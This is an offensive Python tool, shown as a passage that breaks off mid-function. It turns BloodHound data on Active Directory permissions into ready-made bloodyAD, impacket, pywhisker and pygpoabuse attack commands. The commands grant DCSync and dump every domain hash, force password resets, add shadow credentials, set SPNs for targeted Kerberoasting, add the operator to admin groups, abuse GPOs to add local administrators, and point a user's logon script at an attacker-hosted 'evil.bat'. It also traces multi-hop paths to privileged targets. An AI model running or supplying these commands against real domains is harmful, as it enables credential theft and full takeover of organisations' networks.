#!/usr/bin/env python3
"""
BloodHound → BloodyAD Automation Script - COMPLETE VERSION
Covers ALL abuse primitives: GenericAll, WriteDACL, WriteOwner, ForceChangePassword,
AddKeyCredentialLink, WriteSPN, ReadLAPSPassword, ReadGMSAPassword, etc.

Author: Complete AD Abuse Primitive Coverage
"""

import json
import sys
import os
import shutil
import tempfile
from pathlib import Path
from collections import defaultdict
import zipfile

class BloodHoundParser:
    def __init__(self, bh_zip_path, domain, username, dc_ip):
        self.bh_zip_path = bh_zip_path
        self.domain = domain
        self.username = username
        self.dc_ip = dc_ip
        # Base DN derived from the domain - works for any number of labels
        # (single-label, corp.local, sub.corp.example.com, ...).
        self.base_dn = ','.join(f'DC={part}' for part in domain.split('.') if part)
        self.users = []
        self.computers = []
        self.groups = []
        self.domains = []
        self.ous = []
        self.gpos = []
        self.exploitation_commands = []

        # SID -> display name index, built after parsing. Modern BloodHound
        # (4.x and CE) records the principal of an ACE as "PrincipalSID", not
        # "PrincipalName", so the SID must be resolved to a name to recognise
        # the current user. Without this the parser silently matches nothing.
        self.sid_to_name = {}
        # SIDs that correspond to the operator's own account.
        self.current_sids = set()

        # Track which rights enable which attacks
        self.OWNERSHIP_RIGHTS = ['Owns', 'WriteOwner', 'GenericAll']
        self.DACL_RIGHTS = ['WriteDacl', 'GenericAll']
        self.WRITE_RIGHTS = ['GenericWrite', 'GenericAll']
        self.MEMBER_RIGHTS = ['GenericAll', 'WriteOwner', 'WriteDacl']

    # Map a BloodHound collection file to the bucket it belongs in, using the
    # "<timestamp>_<type>.json" naming convention. Matching the trailing token
    # avoids mis-classifying e.g. "containers.json" or substring collisions.
    _FILE_BUCKETS = {
        'users': 'users', 'computers': 'computers', 'groups': 'groups',
        'domains': 'domains', 'ous': 'ous', 'gpos': 'gpos',
    }

    def _bucket_for(self, filename):
        stem = Path(filename).stem.lower()
        token = stem.rsplit('_', 1)[-1]          # trailing token after timestamp
        if token in self._FILE_BUCKETS:
            return self._FILE_BUCKETS[token]
        # Fall back to substring match (most-specific first) for non-standard names.
        for token in ('computers', 'groups', 'domains', 'users', 'gpos', 'ous'):
            if token in stem:
                return token
        return None

    def extract_and_parse(self):
        """Extract BloodHound ZIP and parse all JSON files."""
        temp_dir = None
        try:
            # Unique, isolated extraction dir so concurrent runs don't collide
            # and stale JSON from a previous run is never re-parsed.
            temp_dir = Path(tempfile.mkdtemp(prefix='bh_extraction_'))
            with zipfile.ZipFile(self.bh_zip_path, 'r') as zip_ref:
                zip_ref.extractall(temp_dir)

            buckets = {
                'users': self.users, 'computers': self.computers,
                'groups': self.groups, 'domains': self.domains,
                'ous': self.ous, 'gpos': self.gpos,
            }

            for json_file in temp_dir.rglob('*.json'):
                bucket = self._bucket_for(json_file.name)
                if bucket is None:
                    continue
                try:
                    with open(json_file, 'r', encoding='utf-8') as f:
                        data = json.load(f)
                    # Both legacy ({"data": [...]}) and CE formats land here.
                    records = data.get('data', []) if isinstance(data, dict) else data
                    if not isinstance(records, list):
                        records = []
                    buckets[bucket].extend(records)
                    print(f"[+] Parsed {len(records)} {bucket}", file=sys.stderr)
                except Exception as e:
                    print(f"[-] Error parsing {json_file.name}: {e}", file=sys.stderr)

            self._build_indexes()
            return True
        except Exception as e:
            print(f"[-] Error: {e}", file=sys.stderr)
            return False
        finally:
            if temp_dir is not None:
                shutil.rmtree(temp_dir, ignore_errors=True)

    @staticmethod
    def _sq(value):
        """Return a value safely wrapped as a single-quoted shell token.

        BloodHound object names/SIDs are attacker-controlled (a malicious or
        compromised DC can set them). They are embedded into the bloodyAD /
        impacket command strings this tool generates, which the operator then
        copies and runs. Without escaping, a name containing a single quote can
        break out of the quoting and append arbitrary shell, which would then
        execute on the OPERATOR's machine. This wraps the value so it is always
        a single inert argument.
        """
        s = '' if value is None else str(value)
        return "'" + s.replace("'", "'\\''") + "'"

    @staticmethod
    def _aces(node):
        """Return a node's ACE list defensively (empty list if malformed)."""
        aces = node.get('Aces') if isinstance(node, dict) else None
        return aces if isinstance(aces, list) else []

    @staticmethod
    def _props(node):
        """Return a node's Properties dict defensively ({} if malformed)."""
        p = node.get('Properties') if isinstance(node, dict) else None
        return p if isinstance(p, dict) else {}

    @staticmethod
    def _object_sid(node):
        """Return a node's SID/object identifier across schema variants."""
        if not isinstance(node, dict):
            return ''
        sid = node.get('ObjectIdentifier') or node.get('ObjectId')
        if not sid:
            props = node.get('Properties')
            sid = props.get('objectid', '') if isinstance(props, dict) else ''
        return sid or ''

    def _build_indexes(self):
        """Build the SID->name map and identify the current user's SID(s)."""
        username_norm = self.normalize_name(self.username)
        for collection in (self.users, self.computers, self.groups,
                           self.domains, self.ous, self.gpos):
            for node in collection:
                if not isinstance(node, dict):
                    continue
                props = node.get('Properties')
                if not isinstance(props, dict):
                    props = {}
                sid = self._object_sid(node)
                name = props.get('name') or props.get('samaccountname') or ''
                if sid and name:
                    self.sid_to_name[sid.upper()] = name

        # Find the operator's own SID(s) by matching sAMAccountName / name.
        for user in self.users:
            if not isinstance(user, dict):
                continue
            props = user.get('Properties')
            if not isinstance(props, dict):
                props = {}
            sam = self.normalize_name(props.get('samaccountname', ''))
            name = self.normalize_name(props.get('name', ''))
            sid = self._object_sid(user)
            if sid and (sam == username_norm or name.split('@')[0] == username_norm):
                self.current_sids.add(sid.upper())

    def normalize_name(self, name):
        """Normalize account names"""
        if not name:
            return ""
        return name.upper().strip()

    def _principal_name(self, ace):
        """Resolve an ACE's principal to a human-readable name."""
        name = ace.get('PrincipalName')
        if name:
            return name
        sid = (ace.get('PrincipalSID') or '').upper()
        return self.sid_to_name.get(sid, sid)

    def _ace_is_current(self, ace):
        """True if this ACE's principal is the current operator's account."""
        sid = (ace.get('PrincipalSID') or '').upper()
        if sid and sid in self.current_sids:
            return True
        # Fall back to name comparison (covers the legacy PrincipalName field
        # and environments where the SID index could not be built).
        return self.is_current_user(self._principal_name(ace))

    def is_current_user(self, principal_name):
        """Exact (not substring) check that a principal is the current user."""
        principal_norm = self.normalize_name(principal_name)
        if not principal_norm:
            return False
        username_norm = self.normalize_name(self.username)
        full_norm = self.normalize_name(f"{self.username}@{self.domain}")
        # Compare the account portion (before any @realm) exactly.
        account = principal_norm.split('@', 1)[0]
        return (account == username_norm or principal_norm == full_norm)
    
    def generate_bloodyad_commands(self):
        """Generate ALL possible BloodyAD exploitation commands"""
        commands = []
        
        print(f"[*] Analyzing attack paths for: {self.username}@{self.domain}", file=sys.stderr)
        
        # ============================================================
        # 1. DOMAIN OBJECT ATTACKS
        # ============================================================
        commands.extend(self._analyze_domain_attacks())
        
        # ============================================================
        # 2. GROUP ATTACKS (Most Common)
        # ============================================================
        commands.extend(self._analyze_group_attacks())
        
        # ============================================================
        # 3. USER ATTACKS
        # ============================================================
        commands.extend(self._analyze_user_attacks())
        
        # ============================================================
        # 4. COMPUTER ATTACKS
        # ============================================================
        commands.extend(self._analyze_computer_attacks())
        
        # ============================================================
        # 5. OU ATTACKS (GPO abuse)
        # ============================================================
        commands.extend(self._analyze_ou_attacks())
        
        # ============================================================
        # 6. GPO ATTACKS
        # ============================================================
        commands.extend(self._analyze_gpo_attacks())

        # ============================================================
        # 7. TRANSITIVE ATTACK PATHS (multi-hop graph traversal)
        # ============================================================
        commands.extend(self._analyze_attack_paths())

        # ============================================================
        # 8. LOW-PRIV QUICK WINS - rights held by Everyone / Authenticated
        #    Users / Domain Users / Domain Computers (any user can abuse these).
        #    Runs after _analyze_attack_paths so self.sid_type is populated.
        # ============================================================
        commands.extend(self._analyze_low_priv_quickwins())

        # Sort by priority
        priority_order = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3}
        commands.sort(key=lambda x: priority_order.get(x['priority'], 999))

        print(f"[+] Generated {len(commands)} exploitation commands", file=sys.stderr)
        return commands

    # ---- Transitive pathfinding ------------------------------------------
    # Rights that let a principal take control of (or add itself to) a target.
    _ABUSABLE_RIGHTS = {
        'GenericAll', 'WriteDacl', 'WriteOwner', 'Owns', 'GenericWrite',
        'WriteProperty', 'AddMember', 'AddSelf', 'AllExtendedRights',
        'ForceChangePassword', 'AddKeyCredentialLink', 'WriteSPN',
        'ReadGMSAPassword', 'ReadLAPSPassword',
    }
    # Privileged group RIDs and well-known builtin SIDs (the "you win" targets).
    _HIGH_VALUE_RIDS = {'512', '516', '518', '519', '520', '521', '526', '527'}
    _HIGH_VALUE_BUILTIN = {
        'S-1-5-32-544',  # Administrators
        'S-1-5-32-548',  # Account Operators
        'S-1-5-32-549',  # Server Operators
        'S-1-5-32-550',  # Print Operators
        'S-1-5-32-551',  # Backup Operators
    }

    def _is_high_value(self, sid):
        s = (sid or '').upper()
        if s in self._HIGH_VALUE_BUILTIN:
            return True
        # The domain object itself is a top-tier target: control of it
        # (WriteDacl/GenericAll/Owns) is a direct route to DCSync. Its
        # ObjectIdentifier is the domain SID, which carries no privileged RID, so
        # a RID match alone never catches it - match on node type instead. The
        # sid_type index is populated by _build_graph(), which always runs before
        # the BFS in _analyze_attack_paths() that calls this. Without this, the
        # common "member of a group that has WriteDacl on the domain -> DCSync"
        # path is silently dropped.
        if getattr(self, 'sid_type', {}).get(s) == 'Domain':
            return True
        return s.rsplit('-', 1)[-1] in self._HIGH_VALUE_RIDS

    def _build_graph(self):
        """Build a directed control graph: principal_sid -> [(target_sid, edge)].

        Edges are MemberOf (member -> group) and any abusable ACE
        (principal -> object it can control). Following these edges forward from
        the operator's SID reaches everything they can ultimately control.
        """
        self.adj = defaultdict(list)
        self.sid_type = {}
        collections = [
            (self.users, 'User'), (self.computers, 'Computer'),
            (self.groups, 'Group'), (self.domains, 'Domain'),
            (self.ous, 'OU'), (self.gpos, 'GPO'),
        ]
        for coll, typ in collections:
            for node in coll:
                if not isinstance(node, dict):
                    continue
                sid = self._object_sid(node).upper()
                if not sid:
                    continue
                self.sid_type[sid] = typ
                for ace in self._aces(node):
                    if not isinstance(ace, dict):
                        continue
                    if ace.get('RightName', '') in self._ABUSABLE_RIGHTS:
                        psid = (ace.get('PrincipalSID') or '').upper()
                        if psid:
                            self.adj[psid].append((sid, ace.get('RightName', '')))
                if typ == 'Group':
                    members = node.get('Members')
                    if isinstance(members, list):
                        for m in members:
                            if isinstance(m, dict):
                                msid = (m.get('ObjectIdentifier') or m.get('ObjectId') or '').upper()
                                if msid:
                                    self.adj[msid].append((sid, 'MemberOf'))

                # PrimaryGroupSID lives on the user/computer object, NOT in the
                # group's Members array - so a user's Domain Users membership (and
                # everything reachable through it) is invisible to a Members-only
                # graph. Add it explicitly, or the most common low-priv start is
                # silently dropped.
                if typ in ('User', 'Computer'):
                    pg = node.get('PrimaryGroupSID') or node.get('PrimaryGroupSid')
                    if isinstance(pg, str) and pg:
                        self.adj[sid].append((pg.upper(), 'MemberOf'))

        # Implicit memberships every authenticated principal holds - BloodHound
        # never lists these in any Members array. The operator IS Authenticated
        # Users and Everyone, so any abusable right held by those well-known
        # principals is a real escalation start for them. This is exactly the
        # "low-priv user finds high-priv access" case; without these edges (and
        # the PrimaryGroupSID edge above) those paths cannot be found at all.
        for _s in self.current_sids:
            for _grp in ('S-1-5-11', 'S-1-1-0'):  # Authenticated Users, Everyone
                self.adj[_s].append((_grp, 'MemberOf'))

    def _analyze_attack_paths(self, max_paths=25, max_depth=8):
        """BFS from the operator's SID(s) to high-value targets; emit each path."""
        if not self.current_sids:
            return []
        self._build_graph()
        commands = []
        reached = set()
        from collections import deque
        for start in self.current_sids:
            q = deque([(start, [(start, None)])])
            visited = {start}
            while q and len(commands) < max_paths:
                cur, path = q.popleft()
                if len(path) > max_depth:
                    continue
                for tgt, edge in self.adj.get(cur, []):
                    if tgt in visited:
                        continue
                    newpath = path + [(tgt, edge)]
                    # Require >= 2 hops (3 nodes): single-hop control is already
                    # reported by the direct-ACE analysis above, so a transitive
                    # path only adds value when it chains through an intermediary.
                    if len(newpath) > 2 and self._is_high_value(tgt) and tgt not in reached:
                        reached.add(tgt)
                        commands.append(self._format_path(newpath))
                        if len(commands) >= max_paths:
                            break
                    visited.add(tgt)
                    q.append((tgt, newpath))
        if commands:
            print(f"[+] Found {len(commands)} transitive attack path(s) to high-value targets",
                  file=sys.stderr)
        return commands

    def _format_path(self, path):
        """Turn a [(sid, edge), ...] path into an exploitation command dict."""
        chain_parts = []
        steps = []
        for i, (sid, edge) in enumerate(path):
            name = self.sid_to_name.get(sid, sid)
            if edge is None:
                chain_parts.append(name)
                continue
            chain_parts.append(f"-[{edge}]->")
            chain_parts.append(name)
            if edge == 'MemberOf':
                continue  # passive: already a member, no action needed
            ttype = self.sid_type.get(sid, '')
            if ttype == 'Group':
                steps.append(f"# {edge} on group {self._sq(name)} -> add yourself\n"
                             f"bloodyAD -d {self.domain} -u {self.username} -p 'PASSWORD' "
                             f"--host {self.dc_ip} add groupMember {self._sq(name)} {self._sq(self.username)}")
            elif ttype in ('User', 'Computer'):
                steps.append(f"# {edge} on {name} -> take control (reset password / shadow creds)\n"
                             f"bloodyAD -d {self.domain} -u {self.username} -p 'PASSWORD' "
                             f"--host {self.dc_ip} set password {self._sq(name)} 'NewP@ssw0rd123!'")
            elif ttype == 'Domain':
                steps.append(f"# {edge} on domain {self._sq(name)} -> grant DCSync\n"
                             f"bloodyAD -d {self.domain} -u {self.username} -p 'PASSWORD' "
                             f"--host {self.dc_ip} add dcsync {self._sq(self.username)}")
            else:
                steps.append(f"# {edge} on {name} ({ttype}) -> abuse per BloodHound guidance")
        chain = ' '.join(chain_parts)
        target_name = self.sid_to_name.get(path[-1][0], path[-1][0])
        return {
            'priority': 'CRITICAL',
            'type': 'AttackPath',
            'description': f'Transitive path ({len(path) - 1} hop(s)) to {target_name}: {chain}',
            'command': '\n\n'.join(steps) if steps else '# Path is via existing group membership (no ACL abuse required)',
            'impact': f'PRIVILEGE ESCALATION to {target_name}',
            'prerequisites': 'Control of the first hop in the chain',
            'opsec': 'Varies per edge; group changes log 4728/4732, password resets log 4724',
        }
    
    def _low_priv_sids(self):
        """Well-known principals that EVERY authenticated user effectively holds."""
        sids = {'S-1-1-0': 'Everyone', 'S-1-5-11': 'Authenticated Users',
                'S-1-5-32-545': 'Users'}
        dom = self.domains[0].get('ObjectIdentifier', '').upper() if self.domains else ''
        if dom.startswith('S-1-5-21'):
            sids[dom + '-513'] = 'Domain Users'
            sids[dom + '-515'] = 'Domain Computers'
        return sids

    def _quickwin_command(self, right, ntype, name):
        d, u, h = self.domain, self.username, self.dc_ip
        base = f"bloodyAD -d {d} -u {u} -p 'PASSWORD' --host {h}"
        if ntype == 'Group':
            return f"{base} add groupMember {self._sq(name)} {self._sq(u)}"
        if ntype == 'Domain':
            return f"{base} add dcsync {self._sq(u)}"
        if ntype in ('User', 'Computer'):
            if right == 'AddKeyCredentialLink':
                return f"python3 pywhisker.py -d {d} -u {u} -p 'PASSWORD' --target {self._sq(name)} --action add"
            return f"{base} set password {self._sq(name)} 'NewP@ssw0rd123!'"
        if ntype == 'GPO':
            return (f"# Modify the GPO to run code on every object it is linked to:\n"
                    f"pygpoabuse {d}/{u}:'PASSWORD' -gpo-id '<GPO-GUID of {name}>' "
                    f"-command 'net localgroup administrators {u} /add'")
        if ntype == 'OU':
            return (f"# Link a malicious GPO to the OU (affects all objects under it):\n"
                    f"# create GPO, then: {base} add gplink {self._sq(name)} '<GPO-DN>'")
        return f"{base}  # abuse {right} on {ntype} {self._sq(name)} per BloodHound guidance"

    def _analyze_low_priv_quickwins(self):
        """Abusable rights held by Everyone / Authenticated Users / Domain Users
        / Domain Computers - what ANY authenticated user can already abuse,
        independent of who the operator is. This is the canonical
        'low-priv user -> high-priv access' starting point."""
        commands = []
        lp = self._low_priv_sids()
        # Ensure sid_type exists for high-value (Domain) detection even when the
        # current user could not be matched (so _analyze_attack_paths returned
        # early without building the graph).
        if not hasattr(self, 'sid_type'):
            self._build_graph()
        seen = set()
        for coll, ntype in ((self.users, 'User'), (self.computers, 'Computer'),
                            (self.groups, 'Group'), (self.domains, 'Domain'),
                            (self.ous, 'OU'), (self.gpos, 'GPO')):
            for node in coll:
                if not isinstance(node, dict):
                    continue
                tsid = self._object_sid(node).upper()
                tname = self._props(node).get('name', tsid)
                for ace in self._aces(node):
                    right = ace.get('RightName', '')
                    psid = (ace.get('PrincipalSID') or '').upper()
                    if right not in self._ABUSABLE_RIGHTS or psid not in lp:
                        continue
                    key = (psid, right, tsid)
                    if key in seen:
                        continue
                    seen.add(key)
                    hv = self._is_high_value(tsid)
                    # "Domain Computers" needs a machine account - reachable by any
                    # user only when MachineAccountQuota > 0. Be precise about that.
                    if 'Computers' in lp[psid]:
                        who = f'any machine account ({lp[psid]}) - any user can create one if MachineAccountQuota > 0'
                        prereq = 'A computer account (add one via MachineAccountQuota>0, or any owned host)'
                    else:
                        who = 'ANY authenticated user'
                        prereq = f'Any valid domain account (member of {lp[psid]})'
                    commands.append({
                        'priority': 'CRITICAL' if hv else ('HIGH' if ntype in ('Group', 'Domain', 'Computer') else 'MEDIUM'),
                        'type': 'LowPrivQuickWin',
                        'description': f'{lp[psid]} has {right} over {ntype} "{tname}" - abusable by {who}',
                        'command': self._quickwin_command(right, ntype, tname),
                        'impact': f'{tname} can be controlled by a low-privileged principal' + (' -> DOMAIN COMPROMISE' if hv else ''),
                        'prerequisites': prereq,
                        'opsec': 'Varies by abuse primitive',
                    })
        if commands:
            print(f"[+] Found {len(commands)} low-priv quick win(s) (rights held by Everyone/Authenticated Users/Domain Users)",
                  file=sys.stderr)
        return commands

    def _analyze_domain_attacks(self):
        """Analyze Domain object for privilege escalation"""
        commands = []
        
        for domain in self.domains:
            if not isinstance(domain, dict):
                continue
            props = self._props(domain)
            domain_name = props.get('name', '')
            
            for ace in self._aces(domain):
                principal = self._principal_name(ace)
                right = ace.get('RightName', '')

                if not self._ace_is_current(ace):
                    continue
                
                # WriteDacl or GenericAll → DCSync
                if right in self.DACL_RIGHTS:
                    commands.append({
                        'priority': 'CRITICAL',
                        'type': 'DCSync',
                        'description': f'{right} on Domain → Grant DCSync and dump all hashes',
                        'command': f"bloodyAD -d {self.domain} -u {self.username} -p 'PASSWORD' --host {self.dc_ip} add dcsync {self._sq(self.username)}",
                        'follow_up': f"impacket-secretsdump '{self.domain}/{self.username}:PASSWORD@{self.dc_ip}'",
                        'impact': 'DUMP ALL DOMAIN HASHES (NTLM + Kerberos)',
                        'prerequisites': f'{right} on Domain',
                        'opsec': 'MEDIUM - Event 4662 (DS Access)'
                    })
                
                # WriteOwner → Take ownership of domain
                elif right == 'WriteOwner':
                    commands.append({
                        'priority': 'CRITICAL',
                        'type': 'DomainOwnership',
                        'description': 'WriteOwner on Domain → Take ownership → WriteDacl → DCSync',
                        'command': f"# Step 1: Take ownership\n" +
                                  f"bloodyAD -d {self.domain} -u {self.username} -p 'PASSWORD' --host {self.dc_ip} set owner {self._sq(self.base_dn)} {self._sq(self.username)}\n\n" +
                                  f"# Step 2: Grant yourself WriteDacl\n" +
                                  f"bloodyAD add genericAll {self._sq(self.base_dn)} {self._sq(self.username)}\n\n" +
                                  f"# Step 3: DCSync\n" +
                                  f"bloodyAD add dcsync {self._sq(self.username)}",
                        'impact': 'FULL DOMAIN CONTROL',
                        'prerequisites': 'WriteOwner on Domain',
                        'opsec': 'HIGH - Ownership change Event 4670'
                    })
        
        return commands
    
    def _analyze_group_attacks(self):
        """Analyze Groups for membership abuse"""
        commands = []
        
        for group in self.groups:
            if not isinstance(group, dict):
                continue
            props = self._props(group)
            group_name = props.get('name', '')
            
            if not group_name:
                continue
            
            # Determine priority based on group name
            priority = 'MEDIUM'
            if 'DOMAIN ADMINS' in group_name.upper():
                priority = 'CRITICAL'
            elif 'ENTERPRISE ADMINS' in group_name.upper() or 'SCHEMA ADMINS' in group_name.upper():
                priority = 'CRITICAL'
            elif 'ADMIN' in group_name.upper():
                priority = 'HIGH'
            
            for ace in self._aces(group):
                principal = self._principal_name(ace)
                right = ace.get('RightName', '')

                if not self._ace_is_current(ace):
                    continue
                
                # GenericAll / WriteDacl / WriteOwner → Add member
                if right in self.MEMBER_RIGHTS:
                    commands.append({
                        'priority': priority,
                        'type': 'AddMember',
                        'description': f'{right} on {group_name} → Add yourself to group',
                        'command': f"bloodyAD -d {self.domain} -u {self.username} -p 'PASSWORD' --host {self.dc_ip} add groupMember {self._sq(group_name)} {self._sq(self.username)}",
                        'impact': f'MEMBERSHIP IN {group_name}',
                        'prerequisites': f'{right} on group',
                        'opsec': 'HIGH - Event 4728/4732 (member added)'
                    })
                
                # AddSelf
                elif right == 'AddSelf':
                    commands.append({
                        'priority': priority,
                        'type': 'AddSelf',
                        'description': f'AddSelf on {group_name}',
                        'command': f"bloodyAD -d {self.domain} -u {self.username} -p 'PASSWORD' --host {self.dc_ip} add groupMember {self._sq(group_name)} {self._sq(self.username)}",
                        'impact': f'MEMBERSHIP IN {group_name}',
                        'prerequisites': 'AddSelf permission',
                        'opsec': 'MEDIUM - Event 4728'
                    })
                
                # AllExtendedRights (includes AddMember)
                elif right == 'AllExtendedRights':
                    commands.append({
                        'priority': priority,
                        'type': 'AddMember',
                        'description': f'AllExtendedRights on {group_name} → Add member',
                        'command': f"bloodyAD -d {self.domain} -u {self.username} -p 'PASSWORD' --host {self.dc_ip} add groupMember {self._sq(group_name)} {self._sq(self.username)}",
                        'impact': f'MEMBERSHIP IN {group_name}',
                        'prerequisites': 'AllExtendedRights',
                        'opsec': 'HIGH - Event 4728'
                    })
        
        return commands
    
    def _analyze_user_attacks(self):
        """Analyze Users for password/credential abuse"""
        commands = []
        
        for user in self.users:
            if not isinstance(user, dict):
                continue
            props = self._props(user)
            target = props.get('samaccountname', '')
            enabled = props.get('enabled', True)
            is_admin = props.get('admincount', False)
            has_spn = props.get('hasspn', False)
            
            if not target or not enabled:
                continue
            
            priority = 'HIGH' if is_admin else 'MEDIUM'
            
            for ace in self._aces(user):
                principal = self._principal_name(ace)
                right = ace.get('RightName', '')

                if not self._ace_is_current(ace):
                    continue
                
                # ForceChangePassword
                if right == 'ForceChangePassword':
                    commands.append({
                        'priority': priority,
                        'type': 'PasswordReset',
                        'description': f'ForceChangePassword on {"PRIVILEGED " if is_admin else ""}user: {target}',
                        'command': f"bloodyAD -d {self.domain} -u {self.username} -p 'PASSWORD' --host {self.dc_ip} set password {self._sq(target)} 'NewP@ssw0rd123!'",
                        'follow_up': f"Use {target}:NewP@ssw0rd123! for access",
                        'impact': f'COMPROMISE {"PRIVILEGED " if is_admin else ""}ACCOUNT',
                        'prerequisites': 'ForceChangePassword',
                        'opsec': 'HIGH - Event 4724 (password reset)'
                    })
                
                # GenericAll → Multiple options
                elif right == 'GenericAll':
                    # Option 1: Reset password
                    commands.append({
                        'priority': priority,
                        'type': 'PasswordReset',
                        'description': f'GenericAll on {target} → Reset password',
                        'command': f"bloodyAD -d {self.domain} -u {self.username} -p 'PASSWORD' --host {self.dc_ip} set password {self._sq(target)} 'NewP@ss123!'",
                        'impact': f'COMPROMISE ACCOUNT',
                        'prerequisites': 'GenericAll',
                        'opsec': 'HIGH - Event 4724'
                    })
                    
                    # Option 2: Set SPN if no SPN exists
                    if not has_spn:
                        commands.append({
                            'priority': priority,
                            'type': 'TargetedKerberoast',
                            'description': f'GenericAll on {target} → Add SPN → Kerberoast',
                            'command': f"bloodyAD -d {self.domain} -u {self.username} -p 'PASSWORD' --host {self.dc_ip} add servicePrincipalName {self._sq(target)} {self._sq(f'HTTP/fake.{self.domain}')}",
                            'follow_up': f"impacket-GetUserSPNs {self.domain}/{self.username}:'PASSWORD' -request-user {self._sq(target)} && hashcat -m 13100",
                            'impact': 'CRACK PASSWORD OFFLINE',
                            'prerequisites': 'GenericAll',
                            'opsec': 'MEDIUM - SPN change logged'
                        })
                    
                    # Option 3: Shadow Credentials (AddKeyCredentialLink)
                    commands.append({
                        'priority': priority,
                        'type': 'ShadowCredentials',
                        'description': f'GenericAll on {target} → Shadow Credentials attack',
                        'command': f"# Requires pywhisker tool\n" +
                                  f"python3 pywhisker.py -d {self.domain} -u {self.username} -p 'PASSWORD' --target {self._sq(target)} --action add",
                        'follow_up': "Use generated certificate to authenticate as target",
                        'impact': 'AUTHENTICATE AS TARGET (stealthy)',
                        'prerequisites': 'GenericAll + pywhisker',
                        'opsec': 'LOW - very stealthy attack'
                    })
                
                # GenericWrite / WriteProperty
                elif right in ['GenericWrite', 'WriteProperty']:
                    # Add SPN for Kerberoasting
                    if not has_spn:
                        commands.append({
                            'priority': priority,
                            'type': 'TargetedKerberoast',
                            'description': f'{right} on {target} → Set SPN → Kerberoast',
                            'command': f"bloodyAD -d {self.domain} -u {self.username} -p 'PASSWORD' --host {self.dc_ip} add servicePrincipalName {self._sq(target)} {self._sq(f'HTTP/fake.{self.domain}')}",
                            'follow_up': f"impacket-GetUserSPNs {self.domain}/{self.username}:'PASSWORD' -request-user {self._sq(target)}",
                            'impact': 'TARGETED KERBEROAST',
                            'prerequisites': f'{right}',
                            'opsec': 'MEDIUM - SPN modification logged'
                        })
                    
                    # Set script path for execution
                    commands.append({
                        'priority': priority,
                        'type': 'ScriptPath',
                        'description': f'{right} on {target} → Set malicious logon script',
                        'command': f"bloodyAD -d {self.domain} -u {self.username} -p 'PASSWORD' --host {self.dc_ip} set object {self._sq(target)} scriptPath '\\\\attacker\\share\\evil.bat'",
                        'follow_up': "Wait for user to logon",
                        'impact': 'CODE EXECUTION AS TARGET USER',
                        'prerequisites': f'{right} + SMB share',
                        'opsec': 'LOW-MEDIUM'
                    })
                
                # WriteSPN specifically
                elif right == 'WriteSPN':
                    commands.append({
                        'priority': priority,
                        'type': 'TargetedKerberoast',
                        'description': f'WriteSPN on {target} → Targeted Kerberoasting',
                        'command': f"bloodyAD -d {self.domain} -u {self.username} -p 'PASSWORD' --host {self.dc_ip} add servicePrincipalName {self._sq(target)} {self._sq(f'HTTP/{target}.{self.domain}')}",
                        'follow_up': f"impacket-GetUserSPNs {self.domain}/{self.username}:'PASSWORD' -request-user {self._sq(target)}",
                        'impact': 'KERBEROAST SPECIFIC USER',
                        'prerequisites': 'WriteSPN',
                        'opsec': 'MEDIUM'
                    })
                
                # AddKeyCredentialLink (Shadow Credentials)
                elif right == 'AddKeyCredentialLink':
                    commands.append({
                        'priority': priority,
                        'type': 'ShadowCredentials',
                        'description': f'AddKeyCredentialLink on {target} → Shadow Credentials',
                        'command': f"python3 pywhisker.py -d {self.domain} -u {self.username} -p 'PASSWORD' --target {self._sq(target)} --action add",
                        'follow_up': "Authenticate using certificate",
                        'impact': 'STEALTHY AUTHENTICATION AS TARGET',
                        'prerequisites': 'AddKeyCredentialLink + pywhisker',
                        'opsec': 'LOW - very stealthy'
                    })
                
                # ReadLAPSPassword
                elif right == 'ReadLAPSPassword':
                    # This is actually for computers, but included here
                    commands.append({
                        'priority': 'HIGH',
                        'type': 'ReadLAPS',
                        'description': f'ReadLAPSPassword on {target}',
                        'command': f"bloodyAD -d {self.domain} -u {self.username} -p 'PASSWORD' --host {self.dc_ip} get object {self._sq(target)} --attr ms-Mcs-AdmPwd",
                        'impact': 'READ LOCAL ADMIN PASSWORD',
                        'prerequisites': 'ReadLAPSPassword',
                        'opsec': 'LOW - reading attribute'
                    })
                
                # ReadGMSAPassword
                elif right == 'ReadGMSAPassword':
                    commands.append({
                        'priority': 'HIGH',
                        'type': 'ReadGMSA',
                        'description': f'ReadGMSAPassword on {target}',
                        'command': f"bloodyAD -d {self.domain} -u {self.username} -p 'PASSWORD' --host {self.dc_ip} get object {self._sq(target)} --attr msDS-ManagedPassword",
                        'follow_up': "Decode password blob",
                        'impact': 'READ SERVICE ACCOUNT PASSWORD',
                        'prerequisites': 'ReadGMSAPassword',
                        'opsec': 'LOW'
                    })
                
                # WriteOwner
                elif right == 'WriteOwner':
                    commands.append({
                        'priority': priority,
                        'type': 'TakeOwnership',
                        'description': f'WriteOwner on {target} → Ownership → Full control',
                        'command': f"bloodyAD -d {self.domain} -u {self.username} -p 'PASSWORD' --host {self.dc_ip} set owner {self._sq(target)} {self._sq(self.username)}",
                        'follow_up': "Then reset password or modify attributes",
                        'impact': 'FULL CONTROL OF USER',
                        'prerequisites': 'WriteOwner',
                        'opsec': 'MEDIUM - Event 4670'
                    })
                
                # WriteDacl
                elif right == 'WriteDacl':
                    commands.append({
                        'priority': priority,
                        'type': 'WriteDACL',
                        'description': f'WriteDacl on {target} → Grant GenericAll → Full control',
                        'command': f"bloodyAD -d {self.domain} -u {self.username} -p 'PASSWORD' --host {self.dc_ip} add genericAll {self._sq(target)} {self._sq(self.username)}",
                        'follow_up': "Then reset password",
                        'impact': 'FULL CONTROL',
                        'prerequisites': 'WriteDacl',
                        'opsec': 'MEDIUM'
                    })
                
                # AllExtendedRights (includes ForceChangePassword)
                elif right == 'AllExtendedRights':
                    commands.append({
                        'priority': priority,
                        'type': 'PasswordReset',
                        'description': f'AllExtendedRights on {target} → Reset password',
                        'command': f"bloodyAD -d {self.domain} -u {self.username} -p 'PASSWORD' --host {self.dc_ip} set password {self._sq(target)} 'NewPass123!'",
                        'impact': 'COMPROMISE ACCOUNT',
                        'prerequisites': 'AllExtendedRights',
                        'opsec': 'HIGH - Event 4724'
                    })
        
        return commands
    
    def _analyze_computer_attacks(self):
        """Analyze Computers for RBCD and other attacks"""
        commands = []
        
        for computer in self.computers:
            if not isinstance(computer, dict):
                continue
            props = self._props(computer)
            comp_name = props.get('name', '')
            enabled = props.get('enabled', True)
            
            if not comp_name or not enabled:
                continue
            
            for ace in self._aces(computer):
                principal = self._principal_name(ace)
                right = ace.get('RightName', '')

                if not self._ace_is_current(ace):
                    continue
                
                # GenericAll / GenericWrite / WriteProperty → RBCD
